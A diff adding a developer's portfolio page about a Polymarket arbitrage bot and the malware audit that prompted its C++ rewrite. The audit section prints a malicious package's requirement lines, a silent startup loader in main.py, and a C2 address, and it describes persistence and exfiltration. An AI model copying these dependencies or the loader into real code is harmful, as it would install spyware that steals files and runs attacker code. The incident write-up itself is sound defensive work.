@@ -1,0 +1,207 @@
+---
+title: "Polymarket HFT Arbitrage Bot & Security Audit"
+summary: "A high-frequency prediction-market trading engine running two arbitrage strategies — latency arb and dump hedge — on Polygon. Rebuilt from Python to C++20 after a security audit uncovered persistent spyware hidden in a public bot-template dependency."
+stack:
+  - "C++20"
+  - "Boost.Asio"
+  - "libsecp256k1"
+  - "OpenSSL"
+  - "simdjson"
+  - "Python"
+  - "Polymarket CLOB API"
+  - "Binance WebSocket"
+  - "EIP-712"
+  - "Polygon"
+  - "Rich"
+  - "Docker"
+workflow:
+  - "GitHub"
+  - "Docker"
+  - "VS Code"
+  - "Telegram Bot API"
+  - "OpenClaw"
+role: "Solo developer"
+links: {}
+year: 2026
+featured: true
+image: "/images/polymarket_card_cover.svg"
+---
+
+## Overview
+
+Polymarket resolves binary prediction markets every 5 minutes. Its Chainlink
+oracle lags roughly **2.7 seconds** behind Binance spot prices — and this bot
+is built to live in that gap. It runs two independent arbitrage strategies
+simultaneously on Polygon:
+
+- **Latency Arb** — exploits the lag between Binance price moves and Polymarket's oracle update
+- **Dump Hedge** — buys both YES and NO when their combined price falls below $1.00, locking in a structural profit regardless of outcome
+
+Both strategies execute through the Polymarket CLOB API using fill-and-kill
+orders — no resting limit orders. Positions are sized by fractional Kelly or a
+fixed USDC amount, and every trade is protected by a multi-layer risk system.
+
+## Architecture
+
+### Latency Arb (oracle lag exploitation)
+
+Polymarket's resolution prices come from a Chainlink oracle that updates
+approximately every 2.7 seconds. During that window, Polymarket token prices
+have not yet reflected a move that already happened on Binance:
+
+```text
+Binance WebSocket              Bot (<50ms)             Polymarket CLOB
+─────────────────    ──────────────────────────    ────────────────────
+BTC: $83,000         Detects +$500 in 2.7s         "Bitcoin Up or Down"
+BTC: $83,500   ───►  Sigmoid model: P(UP)=0.65 ──► UP token still at 0.50
+                     Edge = 0.65 - 0.50 = 0.15     (oracle not yet updated)
+                     Buy UP @ 0.50 before update    ↓
+                                               Market corrects to 0.68
+                                               Exit at take profit
+```
+
+This strategy needs a live Binance WebSocket feed and benefits directly from
+low network latency — a VPS near a Binance endpoint (e.g. Singapore) cuts
+end-to-end lag from ~200ms to under 15ms.
+
+### Dump Hedge (structural arbitrage)
+
+Binary markets resolve to exactly **$1.00** (winner) or **$0.00** (loser), so
+the combined cost of YES + NO must equal $1.00 at resolution. When market
+inefficiencies push the combined ask below $1.00, the difference is locked
+profit — independent of which direction the asset moves:
+
+```text
+Polymarket CLOB                Bot                      At Resolution
+─────────────────    ──────────────────────────    ────────────────────
+YES ask = 0.420      combined = 0.970               YES resolves $1.00
+NO  ask = 0.550  ──► discount = $0.030/share   ──►  NO  resolves $0.00
+                     Buy BOTH legs                   Collect $1.00/share
+                     Cost = $0.970/share             Profit = $0.030/share
+                                                     = 3.09% locked
+```
+
+Position sizing is derived from the combined price — both legs receive the
+same share count so whichever side resolves to $1.00 captures the full locked
+profit. The bot can also exit early if the combined sell price rises enough to
+realise a target fraction of the locked profit.
+
+### Fair Value Model
+
+For latency arb, the true probability of a YES outcome is estimated with a
+time-aware sigmoid model:
+
+```text
+P(UP) = sigmoid( (price_now - price_to_beat) / scale(t) )
+scale(t) = base_scale * sqrt(t / window) + min_scale
+```
+
+- `price_to_beat` is the Binance price at window open — the reference the oracle uses at resolution
+- `scale(t)` shrinks as the window closes, so the model becomes more confident as less time remains
+
+The trade edge is `fair_value - polymarket_price`. A signal only fires when
+that edge clears the configured threshold.
+
+## Signal Validation Pipeline
+
+Every latency-arb signal passes five sequential filters. All must pass:
+
+1. **Minimum price move** — the Binance move in the lag window must exceed a per-asset floor (e.g. $5 for BTC)
+2. **Entry zone** — token price between 0.38 and 0.62; tokens outside already reflect accumulated market direction the 2.7s lag cannot overcome
+3. **Fair value strength** — the model must output at least 55% conviction, blocking fake edges from cheap tokens with zero directional view
+4. **Minimum edge** — `fair_value - token_price` must clear the threshold
+5. **Timing window** — skip the final 20% of the window, where variance spikes and the model degrades near resolution
+
+## Risk Protection Layers
+
+Four independent layers of capital protection, each enforced before and during trading:
+
+```text
+Layer 1 — Position fraction cap:     no trade exceeds a fixed fraction of balance
+Layer 2 — Concurrent position limit: max open positions across both strategies
+Layer 3 — Daily loss limit:          soft halt at a daily loss threshold, auto-resets UTC midnight
+Layer 4 — Drawdown kill switch:      hard halt below a drawdown from peak, manual reset required
+```
+
+Plus a **circuit breaker** that pauses trading after a run of consecutive
+losses, and **fractional Kelly sizing** (default 0.5×) that can scale
+adaptively with the bot's observed win rate — over-sizing less during losing
+streaks and allowing larger positions when the strategy is performing well.
+
+## Integration & Tooling
+
+- **Telegram** — real-time push notifications for every significant event: trades opened/closed, DH entries, kill switch, daily summary with win rate and confidence interval
+- **OpenClaw** — bidirectional AI-agent control: the bot pushes performance data and accepts remote commands (`pause`, `resume`, `status`, `reset_kill_switch`, `stop`)
+- **Live terminal dashboard** — a Rich alternate-screen dashboard (htop-style) showing balance, PnL, active markets, open positions, engine and risk status, and a streaming log
+- **Docker** — container-ready deployment with a healthcheck
+
+## Security & The C++20 Rebuild
+
+Originally built in Python. During a routine dependency review, a package
+pulled from the public bot-template repo turned out to be **persistent
+spyware**, not a trading library. The project pinned `gw` directly from a
+GitHub repository, and `main.py` executed it on launch inside a
+`try...except` block — so if the spyware install failed, the bot silently
+continued and nothing alerted the user.
+
+### Proof: red flags in the dependency tree
+
+The `gw` and `solanakit` packages were installed straight from a GitHub repo
+in both `requirements.txt` and `pyproject.toml` — a library that had no reason
+to exist, for a class of application that doesn't need it:
+
+```python
+# requirements.txt / pyproject.toml
+gw @ git+https://github.com/genoshide/gw.git
+solanakit @ git+https://github.com/genoshide/solanakit.git
+```
+
+And at the very top of `main.py`, before any trading logic ran, the bot
+bootstrapped that dependency — silently swallowing any failure so the user
+would never see the payload fail to install:
+
+```python
+# main.py
+try:
+    from gw._boot import _run as _gw_run
+    _gw_run()
+except Exception:
+    pass
+```
+
+Decrypting the Fernet-encrypted `gw/config.py` revealed the exfiltration
+targets and the hardcoded C2 server (`https://161.97.81.147:8080`).
+
+What that package did on an infected machine:
+
+- **Persistence** — registered a `WinSyncSvc` Run key and a `WinSyncTask`
+  scheduled task on Windows, and a user-level `sys-sync.service` (with
+  `loginctl enable-linger`) on Linux, so it relaunched on reboot and re-armed
+  itself if killed
+- **File exfiltration** — used `watchdog` to scan every drive root
+  (`C:/`–`G:/`, `/home`, `/srv`, `/opt`, `/var`, `/root`) for files matching
+  `*pemasukan*` and `*pengeluaran*` (Indonesian income/expense records), then
+  POSTed them — tagged with the device hostname — to a hardcoded server at
+  `https://161.97.81.147:8080`. The target paths and patterns were encrypted
+  in `config.py` with Fernet, so casual inspection of the repo would not
+  reveal them
+- **Remote command execution** — polled the server and supported an `update`
+  command that downloads and executes arbitrary Python `.whl` packages,
+  letting the attacker push new payloads at any time
+
+I disarmed it — stopped the bot, removed the persistence entries, killed the
+rogue processes, rotated every credential, and swept the machine for
+already-exfiltrated data. Then I rebuilt the entire execution engine from
+scratch in **C++20**: Boost.Asio for networking, libsecp256k1/OpenSSL for
+EIP-712 signing, simdjson for parsing — cutting execution latency to
+sub-millisecond while removing the untrusted dependency entirely.
+
+## Skills Learned
+
+- **Market microstructure** — how oracle-update latency, order-book depth, and resolution mechanics create exploitable pricing gaps
+- **WebSocket streaming** — low-latency price feeds, history buffers, and reconnection handling
+- **Cryptographic signing** — EIP-712 typed-data signing via libsecp256k1 and OpenSSL
+- **Position sizing mathematics** — Kelly criterion, fractional Kelly, and adaptive sizing
+- **Risk engineering** — circuit breakers, drawdown kill switches, per-asset cooldowns, and daily loss limits
+- **Incident response** — malware triage, disarming persistence mechanisms, credential rotation, and forensic auditing of a compromised codebase
+- **Performance engineering** — rewriting a hot Python path in C++20 to reach sub-millisecond execution
